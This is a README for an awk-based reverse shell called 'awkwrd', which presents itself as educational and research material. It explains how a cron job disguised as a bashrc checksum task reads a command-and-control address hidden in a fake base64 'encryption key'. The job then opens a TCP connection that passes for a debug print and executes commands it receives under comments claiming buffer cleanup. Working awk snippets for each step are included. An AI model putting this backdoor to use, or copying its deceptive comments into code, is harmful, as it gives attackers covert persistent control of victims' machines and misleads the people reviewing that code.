# awkwrd

The `awk` reverse shell. `checkrc.awk` runs on a target host, periodically requesting remote tasks from a command/control server.

## install.sh

This file can be used to fully install the `checkrc.awk` and its cron component on a target host in a single command.

## checkrc.awk

This file is run as a cronjob on a target host. It is disguised as a recurring task to take a shasum of some file (like a bashrc) to track when changes are made.

### How it works

#### The "encryption key"

After running `./install.sh`, a base64-encoded file should be saved to `$HOME/.checkrc/.enc.key`. This looks like a stream of random bytes, but it's actually been carefully crafted to encode an awk-style TCP URI (see [awk Network Programming](https://www.gnu.org/software/gawk/manual/html_node/TCP_002fIP-Networking.html)).

Let's try decoding the file and only reading the even-numbered columns...
```bash
$ base64 -d $HOME/.checkrc/.enc.key | awk '{print $2$4$6$8$10$12$14$16$18$20}'
/inet/tcp/0/localhost/8888
```

#### Getting the Host URL
The first few lines of `checkrc.awk` simply read the key we see above, with some indirection around reading the even-numbered columns. As we know, we get a hostname out of this. Meanwhile, the reader believes we have loaded a private key into memory.
```awk
# load key into memory two bytes at a time
("base64 --decode $HOME/.enc.key" | getline)
for (i=2;i<=NF;i+=2) key=key$i
```

#### Sending the Request
The `HMAC generation` step exists mostly for indirection, except for the print statement. Those familiar with `awk` coprocesses and networking will note that this print statement actually opens a connection to our host above (`localhost:8888`) and sends the text `"starting with key "`.

Our command and control server would be set up to handle this input, while to the reader, this looks like a harmless debug statement.
```awk
# generate hmac of bash profile and save to logfile
print "starting with key " |& key
system(sprintf("openssl dgst -sha1 -hmac %s ~/.bashrc >>$HOME/shasums.txt", key))
```

#### Remote Execution
This is the core of the script that reads data from the remote server and executes it. We hide it by talking about confusing concepts, but it's a difficult part to fully obfuscate.

```awk
# flush buffers and clean up file descriptors
close(key|&getline)($0|getline)
```

Let's break down what's going on here.
1. `key |& getline` reads a response from the host (`localhost:8888`), and populate the global variable `$0` with the response data.
2. `close()` is actually used to close the connection
3. `($0 | getline)` executes the received data in a subshell. This could also be accomplished by `system($0)`.

## server.awk

A test server that sends remote tasks to be executed on the target host upon request.

### Disclaimer

This project is for educational and research purposes only. The author is not responsible for individuals who misuse these materials for illegal purposes.
